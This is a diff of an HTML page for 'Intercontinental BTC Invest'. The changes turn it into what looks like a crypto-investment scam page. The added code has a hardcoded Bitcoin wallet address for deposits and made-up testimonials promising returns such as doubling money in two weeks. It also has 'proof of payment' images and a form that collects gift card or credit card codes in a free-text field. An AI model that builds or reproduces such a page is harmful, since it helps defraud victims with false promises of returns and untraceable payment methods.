@@ -1,80 +1,67 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Intercontinental BTC Invest</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
-  <style>
-    body {
-      background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1024px-Bitcoin.svg.png');
-      background-repeat: repeat;
-      background-size: 50px;
-      font-family: 'Orbitron', sans-serif;
-    }
-    .bg-overlay {
-      background-color: rgba(0, 0, 128, 0.85);
-    }
-  </style>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
-<body class="text-white">
-  <div class="bg-overlay min-h-screen flex flex-col">
-    <header class="p-6 text-center text-3xl font-bold border-b border-blue-300">Intercontinental BTC Invest</header>
-    <section class="flex-grow flex flex-col items-center justify-center text-center px-4">
-      <h1 class="text-4xl md:text-6xl font-bold mb-6">Invest in Bitcoin with Confidence</h1>
-      <p class="text-xl md:text-2xl mb-8 max-w-2xl">Join thousands across the globe making smart investments with Intercontinental BTC Invest.</p>
-      <a href="#payment" class="bg-yellow-500 text-black px-6 py-3 rounded-full font-bold hover:bg-yellow-400 transition">Start Investing</a>
-    </section>
-    <section class="px-6 py-10 bg-blue-900">
-      <div class="max-w-4xl mx-auto">
-        <h2 class="text-3xl font-bold mb-4 text-yellow-400">About Us</h2>
-        <p class="text-lg leading-relaxed">We are a global investment firm dedicated to bringing Bitcoin investment opportunities to every continent. With years of experience and a team of blockchain experts, we simplify the process and provide top-tier support and security for your financial growth.</p>
-      </div>
-    </section>
-    <section class="px-6 py-10">
-      <div class="max-w-4xl mx-auto">
-        <h2 class="text-3xl font-bold mb-6 text-yellow-400">Frequently Asked Questions</h2>
-        <div class="space-y-4">
-          <div><h3 class="text-xl font-semibold">🔒 Is my investment secure?</h3><p class="text-lg">Yes, we use top-tier security protocols and blockchain verification to ensure safe transactions.</p></div>
-          <div><h3 class="text-xl font-semibold">📈 What returns can I expect?</h3><p class="text-lg">While crypto markets are volatile, our experts aim to maximize returns through risk-adjusted strategies.</p></div>
-          <div><h3 class="text-xl font-semibold">🌍 Do you support international investors?</h3><p class="text-lg">Absolutely! We work with clients from all over the world with multilingual support.</p></div>
-        </div>
-      </div>
-    </section>
-    <section class="px-6 py-10 bg-blue-900">
-      <div class="max-w-4xl mx-auto">
-        <h2 class="text-3xl font-bold mb-6 text-yellow-400">What Our Investors Say</h2>
-        <div class="grid gap-6 md:grid-cols-2">
-          <div class="bg-blue-800 p-4 rounded-lg shadow">
-            <p class="italic">“I've doubled my investment in just 6 months. This team knows what they're doing!”</p>
-            <p class="mt-2 font-bold">– Maria L., Spain</p>
-          </div>
-          <div class="bg-blue-800 p-4 rounded-lg shadow">
-            <p class="italic">“Professional, transparent, and very helpful. Highly recommend for BTC newbies.”</p>
-            <p class="mt-2 font-bold">– David K., USA</p>
-          </div>
-        </div>
-      </div>
-    </section>
-    <section id="payment" class="px-6 py-10">
-      <div class="max-w-xl mx-auto bg-blue-800 p-6 rounded-lg shadow-lg">
-        <h2 class="text-2xl font-bold mb-4 text-yellow-300">Invest Now</h2>
-        <form class="space-y-4">
-          <input type="text" placeholder="Full Name" class="w-full px-4 py-2 rounded text-black" required>
-          <input type="email" placeholder="Email Address" class="w-full px-4 py-2 rounded text-black" required>
-          <input type="number" placeholder="Amount (USD)" class="w-full px-4 py-2 rounded text-black" required>
-          <select class="w-full px-4 py-2 rounded text-black" required>
-            <option value="">Select Payment Method</option>
-            <option>Bitcoin (BTC)</option>
-            <option>Ethereum (ETH)</option>
-            <option>Credit Card</option>
-          </select>
-          <a href="https://commerce.coinbase.com/checkout/REPLACE_WITH_YOUR_CHECKOUT_ID" target="_blank" class="block text-center bg-yellow-500 text-black px-4 py-2 rounded hover:bg-yellow-400">Pay with Coinbase Commerce</a>
-        </form>
-      </div>
-    </section>
-    <footer class="text-center p-4 bg-blue-950 border-t border-blue-300">© 2025 Intercontinental BTC Invest. All rights reserved.</footer>
+<body class="bg-gray-900 text-white">
+
+<header class="text-center py-10 bg-blue-800">
+  <h1 class="text-4xl font-bold">Intercontinental BTC Invest</h1>
+  <p class="text-lg mt-2">Trusted Bitcoin Investment Platform</p>
+</header>
+
+<section class="py-10 px-4 text-center">
+  <h2 class="text-2xl font-bold mb-4">Pay with Bitcoin</h2>
+  <p class="mb-2">Send BTC to the wallet address below:</p>
+  <p class="text-lg font-mono break-all mb-4">1gRYWSPjNxM4PT6WRxyCMkvopWsHKZYTy</p>
+  <a href="bitcoin:1gRYWSPjNxM4PT6WRxyCMkvopWsHKZYTy" target="_blank">
+    <button class="bg-yellow-500 hover:bg-yellow-600 text-black px-6 py-2 rounded-full mb-4">Pay with Bitcoin</button>
+  </a>
+  <img src="qr-code.png" alt="BTC QR Code" class="mx-auto w-40 h-40 mt-4" />
+</section>
+
+<section class="py-10 px-4 bg-gray-800 text-center">
+  <h2 class="text-2xl font-bold mb-4">New Testimonials (Last 3 Months)</h2>
+  <div class="space-y-4">
+    <blockquote>“I invested $300 and doubled it in 2 weeks. Super smooth experience!” – Linda A. 🇨🇦</blockquote>
+    <blockquote>“Best BTC platform I’ve used. Quick returns, no hassle.” – Daniel O. 🇳🇬</blockquote>
+    <blockquote>“Customer service was fast and payment was real.” – Maria H. 🇪🇸</blockquote>
+    <blockquote>“Received $4,000 profit in 30 days! Legit.” – Kelvin M. 🇺🇸</blockquote>
   </div>
+</section>
+
+<section class="py-10 px-4 text-center bg-gray-900">
+  <h2 class="text-2xl font-bold mb-4">Proof of Payment</h2>
+  <p class="mb-4">Recent verified withdrawals:</p>
+  <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
+    <img src="proof1.jpg" alt="Payment Proof 1" class="w-full h-auto rounded">
+    <img src="proof2.jpg" alt="Payment Proof 2" class="w-full h-auto rounded">
+    <img src="proof3.jpg" alt="Payment Proof 3" class="w-full h-auto rounded">
+  </div>
+</section>
+
+<section class="py-10 px-4 bg-gray-800 text-center">
+  <h2 class="text-2xl font-bold mb-4">Pay with Gift Card / Credit Card</h2>
+  <form class="max-w-xl mx-auto text-left space-y-4 bg-gray-700 p-6 rounded-lg">
+    <input type="text" placeholder="Full Name" class="w-full p-2 rounded text-black" required>
+    <input type="email" placeholder="Email Address" class="w-full p-2 rounded text-black" required>
+    <select class="w-full p-2 rounded text-black" required>
+      <option value="">Select Payment Method</option>
+      <option value="giftcard">Gift Card</option>
+      <option value="creditcard">Credit Card</option>
+    </select>
+    <textarea placeholder="Message or Card Code" class="w-full p-2 rounded text-black" rows="4" required></textarea>
+    <button type="submit" class="bg-green-500 hover:bg-green-600 px-4 py-2 rounded text-white">Submit</button>
+  </form>
+</section>
+
+<footer class="text-center py-6 bg-blue-800">
+  <p>&copy; 2025 Intercontinental BTC Invest. All rights reserved.</p>
+</footer>
+
 </body>
 </html>
